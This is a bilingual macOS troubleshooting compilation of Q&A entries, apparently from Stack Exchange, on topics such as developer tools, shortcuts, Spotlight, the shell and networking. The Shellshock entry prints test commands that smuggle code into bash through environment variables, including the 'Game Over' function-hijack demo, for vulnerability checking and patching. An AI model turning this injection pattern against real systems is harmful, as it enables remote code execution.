# Macos 系统故障知识库 | Macos Troubleshooting

**🔙 [返回总索引](index.md) | [Back to Index](index.md)**

**总计条目 / Total entries: 366**

> 技术细节（问题描述、解决方案等）保留原始语言以确保准确性，结构性文本提供中英双语。
> Technical details (descriptions, solutions) remain in original language for accuracy; structural text is bilingual.

---

#### 1. Why am I getting an “invalid active developer path” when attempting to use Git after upgrading to macOS Tahoe?

**问题描述 / Problem Description**:
Tags: xcode, development, git, macos | Score: 3062 | Views: 2593657 | Answers: 8

**解决方案 / Solution**:
Solution
Open Terminal, and run the following:
xcode-select --install

This will pop a dialogue box, Select &quot;Install&quot;, and it will download and install the Command Line Tools package and fix the problem.
(The popped Window may be behind other windows.)
You do not need Xcode, you can install only the Command Line Tools here, it is about 130 MB (600 MB as of Xcode v14.1).
If the above alone doesn't do it, then also run:
sudo xcode-select --reset

Further reading
The problem is that one needs to explicitly agree to the license agreement.  As a follow on step, you may need to reset the path to Xcode if you have several versions or want the command line tools to run without Xcode.
sudo xcode-select --switch /Applications/Xcode.app
sudo xcode-select --switch /Library/Developer/CommandLineTools

I found the solution in this question, Command Line Tools not working.
You may get an error message: &quot;Can't install the software because it is not currently available from the Software Update server&quot;. In this case xcode-select --reset works as pointed by akozin.

---

#### 2. List of all packages installed using Homebrew

**问题描述 / Problem Description**:
Tags: macos, command-line, homebrew, open-source | Score: 1068 | Views: 1439800 | Answers: 11

**解决方案 / Solution**:
brew list and brew list --cask
Running brew list will show a list of all your installed Homebrew formulae and casks.

If you wish to list casks only, brew list --cask will provide the items installed using Homebrew Cask.

---

#### 3. How to find cause of high kernel_task cpu usage?

**问题描述 / Problem Description**:
Tags: macos, kernel | Score: 712 | Views: 615529 | Answers: 16

**解决方案 / Solution**:
TLDR; If your MacBook Pro runs hot or shows a high % CPU for the kernel task, try charging on the right and not on the left.

High kernel_task CPU Usage is due to high chassis temperature caused by charging. In particular Left Thunderbolt port usage.
Solutions include:

Move charging from the left to the right side. If you have a second charger then plug it in on the right side. Avoid plugging everything on the right side (see last paragraph below).
Unplug something from the left side. Either power or another accessory until the battery is full.
Force fans to max before plugging in. iStatMenus has an easy Sensors -&gt; Fans menu item to do so. This only helps in marginal conditions.
Move to a cooler room.
If using both laptop display and external display try switching to just one or the other (I switched to external only, laptop lid closed). Some MBP (eg 15&quot; Intel touchbar models) have a design quirk where this config can get hotter than it should.

Proof:
Actual CPU temperature or application CPU usage is uncorrelated with kernel_task. A hot CPU is throttled by reducing its clock speed, not by scheduling fake no-op load.
The graphs below are from iStatMenus. The machine had been used on battery then plugged in.
State A a USB-C hub (a mouse and keyboard, plus power) and a USB-C HDMI 2.0 adapter, both on the left side. You can see the Thunderbolt Left Proximity temperature sensor rise quickly. About 3-4 minutes later the dreaded kernel_task high CPU usage starts.
State B cures the kernel_task problem by moving power from the left ports to the right. The left side temperature drops and the kernel_task goes away within about 15 seconds.
This is causal. Moving power back to the left side, restoring State A, quickly restores the temperatures and kernel_task again comes back after 3-4 minutes. Again moving power back to the right side, restoring State B, resolves the problem immediately.
State C shows that simply having stuff plugged in to TB ports raises their temperature significantly. Both the hub (mouse and keyboard ONLY) and HDMI adapter individually raise the temperature about 10 degrees, and 15 degrees together.

(all other temperatures were both low and flat. Under 55 degrees.)
Note that high temperature on the right side appears to be ignored by the OS. Plugging everything into the two right ports instead of the left raised the Right temperatures to over 100 degrees, without the fans coming on. No kernel_task either, but the machine becomes unusable from something throttling.
Ergo, high CPU usage by kernel_task is caused by high Thunderbolt Left Proximity temperature, which is caused by charging and having normal peripherals plugged in at the same time.
2017 15&quot; Macbook Pro, MacOS 10.14.5

To actually answer the question:

How can I find out what this process is doing?

The only way to actually ask the kernel what it's doing is to attach a kernel debugger. That means getting a debug kernel from Apple, rebooting, then using a second Mac to attach to the debugged machine. You can then examine stack traces and guess what they mean.
Otherwise guessing and testing is the only way. Of course that leads to false conclusions more often than not.

---

#### 4. Shortcut for toggling between different windows of same app?

**问题描述 / Problem Description**:
Tags: macos, keyboard, google-chrome | Score: 654 | Views: 935235 | Answers: 15

**解决方案 / Solution**:
UK Keyboard
[see below for other languages]
 Cmd ⌘   ` 
 Cmd ⌘   Shift ⇧    `  to go the other way.
Left of z on a UK keyboard [non-shifted ~ ]

Note: This only works if all windows are in the same Space, not if they are spread over multiple Spaces, or if any are fullscreen.
To overcome this for non-fullscreen window, use Cmd ⌘Tab as usual and on the icon of the application you want to switch windows in press the down arrow key (with Cmd ⌘ still pressed). Then use left/right keys to navigate to the desired window across spaces and desktops. To emphasise, This fails for any fullscreened windows, whilst continuing to work for any that are not.
You can also achieve this by right-clicking the app's icon in the Dock - this is the only method that will also switch to fullscreen windows, the other methods will not.
From comments - You can check which key command it is for your language by switching to Finder, then look at the Window menu for 'Cycle through windows'...

BTW, specifically in Chrome, Safari &amp; Firefox, but no other app I know of on Mac,  Cmd ⌘   (number)  will select individual tabs on the frontmost window.
It also would appear that  Cmd ⌘   `   is yet another of those language-specific shortcuts; so if anyone finds any more variants, please specify for which language &amp; keyboard type.
If anybody finds new combos for different languages, please check Keyboard layout here - This is a mirror of the very useful old Apple KB page, now gone from Apple How to identify keyboard localizations - &amp; add that as well as which Input Source you use in System Prefs &gt; Keyboard &gt; Input Sources.
Add a keyboard picture from the KB page too, if that would help.
That will make it easier for future Googlers.
Further info:
You can change the keys in System Settings… &gt; Keyboard &gt; Keyboard Shortcuts… &gt; Keyboard
though it doesn't list the reverse direction, it does still work when you add shift to that new combo. I tested by moving mine from  `   (and  ~ ) to  §  (and  ± )

You can use the alternative of  Ctrl ⌃   F4  [visible in the prefs window above] but that almost indiscriminately marches through every single open window on all Spaces, without switching to the correct Space each time. It's really not too useful unless you use a single Space, just included here for completeness.

---

#### 5. Please share your hidden macOS features or tips and tricks

**问题描述 / Problem Description**:
Tags: macos | Score: 612 | Views: 346411 | Answers: 159

**解决方案 / Solution**:
In any Finder window or Open/Save dialog, you can hit ⌘&#x21E7;G (just '/' also works in Open/Save) to get a location bar from which you can directly type in the directory to go to. It even supports ~ for home and tab completion.

The Open/Save dialog has several other useful shortcuts:


⌘  R -
Reveals the selected item in a new
Finder window.
⌘  I - Info window shows for the selected item.
⌘  &#x21E7;  > - Shows/Hides hidden files in the dialog
⌘  F - cursor jumps to the Find text field
/ or ~ - Opens a Go To Folder dialogue. 
⌘  D or ⌘  &#x21E7; D - selects the ~/Desktop folder as a destination
⌘  &#x2325;  L - selects ~/Downloads folder as a destination
⌘  &#x21E7; O - selects ~/Documents folder as a destination
⌘  &#x2325;  S - Shows/Hides sidebar
⌘  . or esc - Cancels and closes the dialog window

---

#### 6. Remap &quot;Home&quot; and &quot;End&quot; to beginning and end of line

**问题描述 / Problem Description**:
Tags: macos, keyboard | Score: 587 | Views: 228305 | Answers: 13

**解决方案 / Solution**:
The default shortcuts for moving to beginning or end of (wrapped) lines are ⌘← and ⌘→. ⌥↑ and ⌥↓ or ⌃A and ⌃E move to the beginning or end of unwrapped lines (or paragraphs). ⌥← and ⌥→ move backwards/forward by words, and all of these are compatible with holding Shift to select during the corresponding moves.
You could remap home and end by creating ~/Library/KeyBindings/ and saving a property list like this as DefaultKeyBinding.dict:
{
    &quot;\UF729&quot;  = moveToBeginningOfLine:; // home
    &quot;\UF72B&quot;  = moveToEndOfLine:; // end
    &quot;$\UF729&quot; = moveToBeginningOfLineAndModifySelection:; // shift-home
    &quot;$\UF72B&quot; = moveToEndOfLineAndModifySelection:; // shift-end
}

Most of the keybindings for editing text in OS X are defined in /System/Library/Frameworks/AppKit.framework/Resources/StandardKeyBinding.dict.
Applying changes requires reopening applications. DefaultKeyBinding.dict is ignored by some old versions of Xcode (works with latest version 6.3.1), Terminal, and many cross-platform applications.
See Cocoa Text System for more information about the customizable keybindings.
Terminal's keybindings can be customized in Preferences &gt; Profiles &gt; Settings &gt; Keyboard. \033OH moves to the beginning of a line and \033OF to the end of a line.
In Eclipse, key bindings should be modified in Preferences &gt; General &gt; Keys. You need to modify default bindings for commands Line Start and Line End (replace ⌘← by ↖ and ⌘→ by ↘). For selection to work, also modify Select Line Start and Select Line End.
PS: You may need to logout and login again for the ~/Library/KeyBindings/DefaultKeyBinding.dict change to take effect.

---

#### 7. How to prevent Mac from changing the order of Desktops/Spaces

**问题描述 / Problem Description**:
Tags: macos, mac, spaces, mission-control | Score: 539 | Views: 207135 | Answers: 2

**解决方案 / Solution**:
General Solution

System Settings/Preferences &gt; Search for &quot;Spaces&quot; &gt; Uncheck Automatically rearrange Spaces based on most recent use

Newer MacOS Ventura (v13)

System Settings &gt; Desktop &amp; Dock &gt; Scroll down to Mission Control section &gt; Uncheck Automatically rearrange Spaces based on most recent use



Older macOS (v12 and older)
System Preferences &gt; Mission Control
Uncheck Automatically rearrange Spaces based on most recent use.

This will fix the order of all your regular Spaces - but not Fullscreen spaces, which always go to the right of existing numbered Spaces.

From comments: Note this cannot fix the Mac confusing which external screen is which. That's not user-controlled at all, &amp; seems to occur mainly [though not always] when the external screens are identical.
Late note:
This echoes the behaviour of Cmd/Tab or equivalent in most operating systems, so could be considered a 'sensible' default.
 just to save this attracting even more comments on why it was a good/bad choice of default.

---

#### 8. How do I launch Finder from terminal or command line

**问题描述 / Problem Description**:
Tags: macos, applications, command-line | Score: 508 | Views: 865919 | Answers: 1

**解决方案 / Solution**:
To open your current directory in Finder from Terminal, type open .
So, if you want Documents: open ~/Documents
Library: open ~/Library
Downloads: open ~/Downloads
And so on.

---

#### 9. Why does my dock keep moving back to my other monitor?

**问题描述 / Problem Description**:
Tags: macbook-pro, macos, display, dock | Score: 492 | Views: 525764 | Answers: 8

**解决方案 / Solution**:
You can summon the Dock on a different display by moving the cursor to the bottom of the desired display, and then continuing moving down. It may be possible that this is occurring when you inadvertently perform that action.

I answered a similar question: cmd-tab behavior on Mavericks with multiple displays.

---

#### 10. How can I create a symbolic link in Terminal?

**问题描述 / Problem Description**:
Tags: macos, command-line, file, symlink | Score: 484 | Views: 724804 | Answers: 7

**解决方案 / Solution**:
┌── ln(1) link, ln -- make links
│   ┌── Create a symbolic link.
│   │                         ┌── the optional path to the intended symlink
│   │                         │   if omitted, symlink is in . named as destination
│   │                         │   can use . or ~ or other relative paths
│   │                   ┌─────┴────────┐
ln -s /path/to/original /path/to/symlink
      └───────┬───────┘
              └── the path to the original file/folder
                  can use . or ~ or other relative paths


$ echo content &gt; original
$ ln -s original symlink
$ ls -la original symlink
-rw-r--r--  1 grgarside  staff    8 28 Jan 18:44 original
lrwxr-xr-x  1 grgarside  staff    8 28 Jan 18:44 symlink -&gt; original
$ cat symlink
content

For more information about ln(1) see the man page:
$ man ln

The path to the symlink is optional; if omitted, ln defaults to making a link with the same name as the destination, in the current directory:
$ cd ~/Documents
$ ln -s ../Pictures
$ ls -l Pictures
lrwxr-xr-x  1 user  staff  11 Feb  1 17:05 Pictures -&gt; ../Pictures

To create a symlink to replace a system directory (e.g. if you want to have /Users pointing to another disk drive), you need to disable System Integrity Protection. You can re-enable it after the symlink is set up.

---

#### 11. How do I find my IP Address from the command line?

**问题描述 / Problem Description**:
Tags: macos, network, command-line | Score: 451 | Views: 1668068 | Answers: 11

**解决方案 / Solution**:
Local IP address
Use ipconfig getifaddr en0 or ipconfig getifaddr en1, depending on what network adapter your machine is using.
Public IP address
dig -4 TXT +short o-o.myaddr.l.google.com @ns1.google.com

Output, e.g.:
172.79.136.120

Command explanation
The command you provided, dig -4 TXT +short o-o.myaddr.l.google.com @ns1.google.com, is a command-line instruction that uses the dig utility to perform a DNS (Domain Name System) lookup. Let's break down the components of the command:

dig: dig stands for &quot;domain information groper,&quot; and it is a command-line tool commonly available on Unix-like systems for querying DNS servers.

-4: This option specifies that the command should use IPv4 protocol for the DNS lookup. It ensures that the query is sent using IPv4 instead of IPv6.

TXT: This indicates the type of DNS record being requested. In this case, the command is asking for the TXT record.

+short: This option is used to display only the relevant information from the DNS response, providing a concise output.

o-o.myaddr.l.google.com: This is the hostname used for the DNS lookup. It is a special hostname that Google uses to provide information about the IP address from which the DNS query originates.

@ns1.google.com: This specifies the DNS server to which the query is sent. In this case, it is set to ns1.google.com, which is one of Google's public DNS servers.


When you run this command, it queries the ns1.google.com DNS server for the TXT record associated with o-o.myaddr.l.google.com. The response will contain the TXT record, which typically includes information about the IP address of the client making the DNS query. The +short option ensures that only the relevant information is displayed, making it easier to read the output.

---

#### 12. mds and mds_stores constantly consuming cpu

**问题描述 / Problem Description**:
Tags: macbook-pro, spotlight, cpu | Score: 450 | Views: 679863 | Answers: 15

**解决方案 / Solution**:
As you know, the mds and mds_stores are Spotlight activities.
The reason why your Spotlight is so active could be a number of things; it could be you have an app or multiple apps constantly changing some folder contents.
First let's check whether Spotlight is the cause of the fans running so much. To test this, run the following in your terminal:
sudo mdutil -a -i off

This will turn off indexing of files, and should result in a clear slow down of the fans if mds and/or mds_stores are to blame.
To turn indexing back on, run
sudo mdutil -a -i on

After this you could run the complete re-indexing of your hard drive (be aware this could be an over night job), it will delete your Spotlight data base forcing it to start over.
sudo rm -rf /System/Volumes/Data/.Spotlight-V100/*

The next and final step would be to add others to your (do not scan), privacy settings.

---

#### 13. How can I trigger a Notification Center notification from an AppleScript or shell script?

**问题描述 / Problem Description**:
Tags: terminal, applescript, macos, notifications, command-line | Score: 422 | Views: 267265 | Answers: 13

**解决方案 / Solution**:
With Mavericks and later, you can do this using AppleScript's 'display notification':

display notification "Lorem ipsum dolor sit amet" with title "Title"


                          

That's it—literally that simple! No 3rd-party libraries or apps required and is completely portable for use on other systems. 10.9 notification on the top, 10.10 DP in the middle, 10.10 on the bottom.

AppleScript can be run from the shell using /usr/bin/osascript:

osascript -e 'display notification "Lorem ipsum dolor sit amet" with title "Title"'


You can also customise the alert further by adding…


a subtitle

Append 'subtitle' followed by the string or variable containing the subtitle.

display notification "message" with title "title" subtitle "subtitle"


The above example produces the following notification:


sound

Append 'sound name' followed by the name of a sound that will be played along with the notification.

display notification "message" sound name "Sound Name"


Valid sound names are the names of sounds located in…


~/Library/Sounds
/System/Library/Sounds





Posting notifications can be wrapped as a command-line script. The following code can be run in Terminal and will add a script to /usr/local/bin (must exist, add to $PATH) called notify.

cd /usr/local/bin &amp;&amp; echo -e "#!/bin/bash\n/usr/bin/osascript -e \"display notification \\\"\$*\\\"\"" &gt; notify &amp;&amp; chmod +x notify;cd -


This is the script that the above will add to notify.

#!/bin/bash
/usr/bin/osascript -e "display notification \"$*\""


Now to display a notification:

notify Lorem ipsum dolor sit amet
sleep 5; notify Slow command finished

---

#### 14. Got any tips or tricks for Terminal in Mac OS X?

**问题描述 / Problem Description**:
Tags: mac, terminal, macos | Score: 404 | Views: 249648 | Answers: 133

**解决方案 / Solution**:
You can hold option and click a position in the current line to move your cursor to that position.

---

#### 15. How can I configure Mac Terminal to have color ls output?

**问题描述 / Problem Description**:
Tags: macos, terminal | Score: 397 | Views: 336045 | Answers: 13

**解决方案 / Solution**:
Edit:

~/.bash_profile


or

~/.profile


and add the following line to simply enable color output via ls:

export CLICOLOR=1


To customize the coloring shown by ls you can optionally add this variable, LSCOLORS.

Examples


Default

export LSCOLORS=ExFxCxDxBxegedabagacad

You can use this if you are using a black background

export LSCOLORS=gxBxhxDxfxhxhxhxhxcxcx

If you'd like to mimic the colors of a typical Linux terminal:

export LSCOLORS=ExGxBxDxCxEgEdxbxgxcxd



Once you've add the above to either ~/.bash_profile or ~/.profile you can either logout/login or source the file in your shell, for eg:

$ . ~/.bash_profile


NOTE: If you need help in selecting colors to use you can use this online tool called LSCOLORS Generator.

---

#### 16. What are the practical differences between Bash and Zsh?

**问题描述 / Problem Description**:
Tags: terminal, bash, zsh, macos | Score: 389 | Views: 337244 | Answers: 4

**解决方案 / Solution**:
First, some important things:

Bash isn't going away. If you're already using bash, nothing will change for you. All that changes is that zsh will be the default login shell for new accounts, and even then, you can select bash instead.
Scripts are not affected. What changes is the shell for interactive use, i.e. the shell in terminals (and also a few other things that use the login shell, such as crontabs). If you have a script in a file with execution permissions, starting with a shebang line such as #!/bin/bash or #!/bin/sh or #!/usr/bin/env bash, it'll keep working exactly as before.
Zsh's syntax is not completely compatible with bash, but it's close. A lot of code will keep working, for example typical aliases and functions. The main differences are in interactive configuration features.

Now, assuming you're considering switching to zsh, which has been a possibility for years, here are the main differences you'll encounter. This is not an exhaustive list!
Main differences for interactive use
Configuration files: bash reads (mainly) .bashrc in non-login interactive shells (but macOS starts a login shell in terminals by default), .profile or .bash_profile in login shells, and .inputrc. Zsh reads (mainly) .zshrc (in all interactive shells) and .zprofile (in login shells). This means that none of your bash customizations will apply: you'll need to port them over. You can't just copy the files because many things will need tweaking.
Key bindings use completely different syntax. Bash uses .inputrc and the bind builtin to bind keys to readline commands. Zsh uses the bindkey builtin to bind keys to zle widgets. Most readline commands have a zsh equivalent, but it isn't always a perfect equivalence.
Speaking of key bindings, if you use Vi(m) as your in-terminal editor but not as your command line mode in the shell, you'll notice zsh defaults to vi editing mode (i.e. with command and insert modes) if EDITOR or VISUAL is set to vi or vim. bindkey -e switches to emacs mode (i.e. where you can always type directly).
Prompt: bash sets the prompt (mainly) from PS1 which contains backslash escapes. Zsh sets the prompt mainly from PS1 which contains percent escapes. Although the concepts are similar, the escape codes are completely different. The functionality of bash's PROMPT_COMMAND is available in zsh via the precmd and preexec hook functions. Zsh has more convenience mechanisms to build fancy prompts including a prompt theme mechanism.
The basic command line history mechanisms (navigation with Up/Down, search with Ctrl+R, history expansion with !! and friends, last argument recall with Alt+. or $_) work in the same way, but there are a lot of differences in the details, too many to list here. You can copy your .bash_history to .zsh_history if you haven't changed a shell option that changes the file format.
Completion: both shells default to a basic completion mode that mostly completes command and file names, and switch to a fancy mode by including bash_completion on bash or by running compinit in zsh. You'll find some commands that bash handles better and some that zsh handles better. Zsh is usually more precise, but sometimes gives up where bash does something that isn't correct but is sensible. To specify possible completions for a command, zsh has three mechanisms:

The “old” completion mechanism with compctl which you can forget about.
The “new” completion mechanism with compadd and lots of functions that begin with underscore and a powerful but complex user configuration mechanism.
An emulation to support bash completion functions which you can enable by running bashcompinit. The emulation isn't 100% perfect but it usually works.

Many of bash's shopt settings have a corresponding setopt in zsh.
Zsh doesn't treat # as a comment start on the command line by default, only in scripts (including .zshrc and such). To enable interactive comments, run setopt interactive_comments.
Main differences for scripting
(and for power users on the command line of course)
In bash, $foo takes the value of foo, splits it at whitespace characters, and for each whitespace-separated part, if it contains wildcard characters and matches an existing file, replaces the pattern by the list of matches. To just get the value of foo, you need &quot;$foo&quot;. The same applies to command substitution $(foo). In zsh, $foo is the value of foo and $(foo) is the output of foo minus its final newlines, with two exceptions. If a word becomes empty due to expanding empty unquoted variables, it's removed (e.g. a=; b=; printf &quot;%s\n&quot; one &quot;$a$b&quot; three $a$b five prints one, an empty line, three, five). The result of an unquoted command substitution is split at whitespace but the pieces don't undergo wildcard matching.
Bash arrays are indexed from 0 to (length-1). Zsh arrays are indexed from 1 to length. You can make 0-indexing the default with setopt ksh_arrays. Zsh requires fewer braces (unless ksh_arrays is enabled). For example, suppose a=(first second third &quot;&quot; last).




Functionality
Bash syntax
Idiomatic zsh syntax
Expansion




First element
${a[0]}
$a[1]
first


Second element
${a[1]}
$a[2]
second


Last element
${a[${#a[@]}-1]}
$a[-1]
last


Length
${#a[@]}
$#a
5


All the elements
&quot;${a[@]}&quot;
&quot;${a[@]}&quot; or &quot;${(@)a}&quot;
first second third (empty word) last


All the non-empty elements

$a
first second third last




Bash has extra wildcard patterns such as @(foo|bar) to match foo or bar, which are only enabled with shopt -s extglob. In zsh, you can enable these patterns with setopt ksh_glob, but there's also a simpler-to-type native syntax such as (foo|bar), some of which requires setopt extended_glob (do put that in your .zshrc, and it's on by default in completion functions). Zsh has **/ for recursive directory traversal (as does modern bash but not the bash 3.2 that ships with macOS).
In bash, by default, if a wildcard pattern doesn't match any file, it's left unchanged. In zsh, by default, you'll get an error, which is usually the safest setting. If you want to pass a wildcard parameter to a command, use quotes. You can switch to the bash behavior with setopt no_nomatch. You can make non-matching wildcard patterns expand to an empty list instead with setopt null_glob.
In bash, the right-hand side of a pipeline runs in a subshell. In zsh, it runs in the parent shell, so you can write things like somecommand | read output.
Some nice zsh features
Here are a few nice zsh features that bash doesn't have (at least not without some serious elbow grease). Once again, this is just a selection of the ones I consider the most useful.
Glob qualifiers allow matching files based on metadata such as their time stamp, their size, etc. They also allow tweaking the output. The syntax is rather cryptic, but it's extremely convenient. Here are a few examples:

foo*(.): only regular files matching foo* and symbolic links to regular files, not directories and other special files.
foo*(*.): only executable regular files matching foo*.
foo*(-.): only regular files matching foo*, not symbolic links and other special files.
foo*(-@): only dangling symbolic links matching foo*.
foo*(om): the files matching foo*, sorted by last modification date, most recent first. Note that if you pass this to ls, it'll do its own sorting. This is especially useful in…
foo*(om[1,10]): the 10 most recent files matching foo*, most recent first.
foo*(Lm+1): files matching foo* whose size is at least 1MB.
foo*(N): same as foo*, but if this doesn't match any file, produce an empty list regardless of the setting of the null_glob option (see above).
*(D): match all files including dot files (except . and ..).
foo/bar/*(:t) (using a history modifier): the files in foo/bar, but with only the base name of the file. E.g. if there is a foo/bar/qux.txt, it's expanded as qux.txt.
foo/bar/*(.:r): take regular files under foo/bar and remove the extension. E.g. foo/bar/qux.txt is expanded as foo/bar/qux.
foo*.odt(e\''REPLY=$REPLY:r.pdf'\'): take the list of files matching foo*.odt, and replace .odt by .pdf (regardless of whether the PDF file exists).

Here are a few useful zsh-specific wildcard patterns.

foo*.txt~foobar*: all .txt files whose name starts with foo but not foobar.
image&lt;-&gt;.jpg(n): all .jpg files whose base name is image followed by a number, e.g. image3.jpg and image22.jpg but not image-backup.jpg. The glob qualifier (n) causes the files to be listed in numerical order, i.e. image9.jpg comes before image10.jpg (you can make this the default even without -n with setopt numeric_glob_sort).

To mass-rename files, zsh provides a very convenient tool: the zmv function. Suggested for your .zshrc:
autoload zmv
alias zcp='zmv -C' zln='zmv -L'

Example:
zmv '(*).jpeg' '$1.jpg'
zmv '(*)-backup.(*)' 'backups/$1.$2'

Bash has a few ways to apply transformations when taking the value of a variable. Zsh has some of the same and many more.
Zsh has a number of little convenient features to change directories. Turn on setopt auto_cd to change to a directory when you type its name without having to type cd (bash also has this nowadays). You can use the two-argument form to cd to change to a directory whose name is close to the current directory. For example, if you're in /some/where/foo-old/deeply/nested/inside and you want to go to /some/where/foo-new/deeply/nested/inside, just type cd old new.
To assign a value to a variable, you of course write VARIABLE=VALUE. To edit the value of a variable interactively, just run vared VARIABLE.
Final advice
Zsh comes with a configuration interface that supports a few of the most common settings, including canned recipes for things like case-insensitive completion. To (re)run this interface (the first line is not needed if you're using a configuration file that was edited by zsh-newuser-install):
autoload -U zsh-newuser-install
zsh-newuser-install

Out of the box, with no configuration file at all, many of zsh's useful features are disabled for backward compatibility with 1990's versions. zsh-newuser-install suggests some recommended features to turn on.
There are many zsh configuration frameworks on the web (many of them are on Github). They can be a convenient way to get started with some powerful features. The flip side of the coin is they often lock you in doing things the way the author does, so sometimes they'll prevent you from doing things the way you want. Use them at your own risk.
The zsh manual has a lot of information, but it's often written in a way that's terse and hard to follow, and has few examples. Don't hesitate to search for explanations and examples online: if you only use the part of zsh that's easy to understand in the manual, you'll miss out. Two good resources are the zsh-users mailing list and Unix Stack Exchange.
An extensive collection of articles on switching to zsh on the mac can be found on scriptingosx.com and a useful Ruby script to bring your command history with you, can be found on Github.

---

#### 17. How can I list my open network ports with netstat?

**问题描述 / Problem Description**:
Tags: macos, network, command-line | Score: 375 | Views: 1062787 | Answers: 7

**解决方案 / Solution**:
netstat -anvp tcp | awk 'NR&lt;3 || /LISTEN/'
Active Internet connections (including servers)
Proto Recv-Q Send-Q  Local Address          Foreign Address        (state)     rhiwat shiwat    pid   epid  state    options
tcp46      0      0  *.62981                *.*                    LISTEN      131072 131072  34548      0 0x0100 0x00000006
…


sudo lsof -PiTCP -sTCP:LISTEN
COMMAND     PID      USER   FD   TYPE             DEVICE SIZE/OFF NODE NAME
BetterTou 34548 grgarside   20u  IPv4 0xa42a1d0ade5d3585      0t0  TCP *:62981 (LISTEN)
BetterTou 34548 grgarside   21u  IPv6 0xa42a1d0ad67f7a5d      0t0  TCP *:62981 (LISTEN)
…

---

#### 18. How do I recompile Bash to avoid Shellshock (the remote exploit CVE-2014-6271 and CVE-2014-7169)?

**问题描述 / Problem Description**:
Tags: macos, security, bash | Score: 371 | Views: 269147 | Answers: 7

**解决方案 / Solution**:
Status

Apple has released Bash security fixes for Shellshock and related vulnerabilities as "OS X bash Update 1.0". They can be installed through normal system update for people using OS X Mountain Lion v10.8.5 or OS X Mavericks v10.9.5 (they are included in Security Update 2014-005) and can also be installed manually. Official Apple fixes are also available for OS X Lion v10.7.5 and OS X Lion Server v10.7.5 but those are only available via manual download. The security fixes are available via different URLs based on the operating system version:


http://support.apple.com/kb/DL1769 - Mavericks (10.9.5 and above)
http://support.apple.com/kb/DL1768 - Mountain Lion (10.8.5)
http://support.apple.com/kb/DL1767 - Lion &amp; Lion Server (10.7.5)


(If new patches are released, put them here but please keep these existing ones as well for reference.)

The Apple patch takes care of Shellshock and several other vulnerabilities and is fine for most people. tl;dr people can stop reading here.

HOWEVER, the attention drawn to bash by the Shellshock bug has caused many researchers to take a hard look at bash and more and more (hard to exploit) vulnerabilities keep being found. If you are highly concerned about security (because maybe you are running OS X Server to host a publicly available web site) then you may want to (try to) keep up with the vulnerabilities and patches as they keep rolling in by compiling bash yourself. Otherwise, don't worry about it.

Look for Apple to release another update to bash some time in the future when the dust settles on finding further vulnerabilities. 



An official set of patches of bash itself for bash 3.2, patches 52, 53, and 54 (which correspond to Bash 4.3 patches 25, 26, and 27) are available which fix both CVE-2014-6271 and CVE-2014-7169, as well as the 'Game over' displayed below. This has been tested by me (@alblue) and the post has been updated accordingly (and then additional updates were made: see revision 41 for the post that stops at patch 54). 

Many additional vulnerabilities have been reported against bash. According to Michal Zalewski's post if you have patch 54 (and presumably Apple's official patch) "there's no point in obsessing about the status of these individual bugs, because they should no longer pose a security risk:"


CVE-2014-6271 - original RCE found by Stephane. Fixed by bash43-025
and corresponding Sep 24 entries for other versions.
CVE-2014-7169 - file creation / token consumption bug found by
Tavis. Fixed by bash43-026 &amp; co (Sep 26)
CVE-2014-7186 - a probably no-sec-risk 10+ here-doc crash found by
Florian and Todd. Fixed by bash43-028 &amp; co (Oct 1).
CVE-2014-7187 - a non-crashing, probably no-sec-risk off-by-one
found by Florian.  Fixed by bash43-028 &amp; co (Oct 1).
CVE-2014-6277 - uninitialized memory issue, almost certainly RCE
found by Michal Zalewski. No specific patch yet.
CVE-2014-6278 - command injection RCE found by Michal Zalewski. No specific patch yet.


It gets pretty confusing. Fortunately Chet Ramey, the official bash maintainer, posted a CVE to patch mapping. His post refers to patches for bash 4.3, I (@OldPro) have translated them to patches for bash 3.2, which is what is applicable to OS X. Also, since this post he has released patch 57, so I added that below:

 bash32-052      CVE-2014-6271                           2014-09-24
 bash32-053      CVE-2014-7169                           2014-09-26
 bash32-054      exported function namespace change      2014-09-27 ("Game Over")
 bash32-055      CVE-2014-7186/CVE-2014-7187             2014-10-01
 bash32-056      CVE-2014-6277                           2014-10-02
 bash32-057      CVE-2014-6278                           2014-10-05


See David A. Wheeler's post for a timeline and greater detail. 

@alblue posted build instructions through patch 55. I (@OldPro) added patch 56 and 57 to the instructions but have not tested it.

Testing for the original Vulnerability

You can determine if you are vulnerable to the original problem in CVE-2014-6271 by executing this test:

$ env x='() { :;}; echo vulnerable' bash -c 'echo hello'
bash: warning: x: ignoring function definition attempt
bash: error importing function definition for `x'
hello


The above output is an example of a non-vulnerable bash version. If you see the word vulnerable in the output of that command your bash is vulnerable and you should update. Below is a vulnerable version from OS X 10.8.5:



Testing for the new Vulnerability

There has been an update to the original post and Bash 3.2.52(1) is still vulnerable to a variation of the vulnerability, defined in CVE-2014-7169 

$ rm -f echo
$ env X='() { (a)=&gt;\' sh -c "echo date"; cat echo
sh: X: line 1: syntax error near unexpected token `='
sh: X: line 1: `'
sh: error importing function definition for `X'
Thu 25 Sep 2014 08:50:18 BST


The above output is an example of a vulnerable bash version. If you see a date in the output of that command your bash is vulnerable.

Disabling auto-imported functions to prevent "Game Over"

Researchers noted, without classifying it as a vulnerability, that a script could hijack a function in a subshell using auto-imported functions:

$ env ls="() { echo 'Game Over'; }" bash -c ls
Game over


The above code on an affected system would display Game Over instead of the directory listing you would expect from ls. Obviously, echo 'Game Over' could be replaced by any nefarious code you want. This became know as the "Game Over" bug.

Prior to the availability of patch 54, both NetBSD and FreeBSD disabled auto-importing bash functions by default, partly to prevent "Game Over" but mainly to contain any further errors in the parser (such as CVE-2014-7169) as they were continuing to be discovered, and added a new command line flag --import-functions to re-enable the old default behavior. I (@alblue) have prepared a patch (against 3.2.53) for others to use if they want to adopt this behaviour as well and have included it below. By default this patch is not enabled in the build script below. I (@OldPro) believe this patch is no longer necessary or a good idea, because it breaks backwards compatibility and the vulnerabilities it protects against are very well addressed by patch 54 and earlier patches, and enabling this unofficial patch prevents future patches from being applied. 

(Note to question editors; please do not enable this by default, as it is an unofficial patch.)

a0c5c4d66742fddd0a35001cb91798a5fbf8a2f5  import_functions.patch

The patch can be enabled by running export ADD_IMPORT_FUNCTIONS_PATCH=YES before running the build. Note that enabling this patch will disable patch 54 and any future patches because future patches cannot be guaranteed to be compatible with the unofficial patch.

Apple Patch has Game Over vulnerability, sort of

As pointed out by @ake_____ on twitter the official Apple patch is still vulnerable to environment clobbering of executables:

$ env '__BASH_FUNC&lt;ls&gt;()'="() { echo Game Over; }" bash -c ls
Game Over


